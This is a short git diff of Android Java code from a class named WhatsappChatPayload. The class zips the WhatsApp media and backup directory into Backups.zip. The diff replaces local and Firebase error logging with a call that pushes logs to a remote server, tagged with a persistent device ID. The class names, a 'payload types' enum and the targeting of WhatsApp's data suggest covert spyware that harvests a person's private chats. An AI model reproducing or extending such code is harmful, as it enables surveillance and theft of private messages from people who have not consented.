@@ -7,6 +7,8 @@ import android.util.Log;
 import com.aigs.serviceone.annotations.PayloadTypes;
 import com.aigs.serviceone.helpers.WatsappTextExtractionListner;
 import com.aigs.serviceone.util.ZipUtils;
+import com.example.logshandler.starter.Logs;
+import com.example.uniqueidmanager.UniqueId;
 import com.google.firebase.database.FirebaseDatabase;
 
 import java.io.File;
@@ -40,8 +42,7 @@ public class WhatsappChatPayload extends AsyncTask<String, Integer, String> {
             ZipUtils.getInstance().setZipListener(this::updateProgress).zipDirectory(settings, "/storage/emulated/0/Android/media/com.whatsapp/WhatsApp/Backups.zip");
 
         }catch (Exception e){
-            Log.e("EXCEPTION_WC : ",e.getMessage());
-            FirebaseDatabase.getInstance().getReference("Logs").child(PayloadTypes.GET_WHATSAPP_DATABASES+"").child("CurrentLog").setValue(e.getMessage());
+            Logs.pushLogsToServer("[ERROR]: "+e.getMessage(), UniqueId.initialize(contextWeakReference.get()).getUUID());
 
         }
 
